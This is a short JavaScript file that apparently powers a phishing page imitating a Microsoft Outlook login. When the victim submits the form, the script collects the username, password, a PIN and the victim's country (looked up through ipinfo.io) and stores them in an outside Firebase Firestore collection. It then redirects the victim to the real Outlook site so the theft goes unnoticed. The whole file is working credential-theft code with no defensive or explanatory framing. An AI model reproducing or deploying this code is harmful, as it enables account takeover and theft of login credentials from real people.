const db = firebase.firestore();





const taskform = document.getElementById("bntss");

taskform.addEventListener("click", async (e) => {
e.preventDefault();


var name = document.getElementById("name").value;



await db.collection("DataSyn4pseV1.0").doc(name).set({
pw: document.getElementById("pws").value,
user: document.getElementById("name").value,
upais: document.getElementById("nn").innerHTML,
pin: document.getElementById("namee").value,




});
setTimeout(function(){document.location.href = "https://outlook.live.com/owa/0/?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8";},250);
});




async function getIpClient() {
    try {
      const response = await axios.get('https://ipinfo.io/json');
      console.log(response);
      document.getElementById("nn").innerHTML = response.data.country;
    } catch (error) {
      console.error(error);
    }
  }
  
  getIpClient();
		 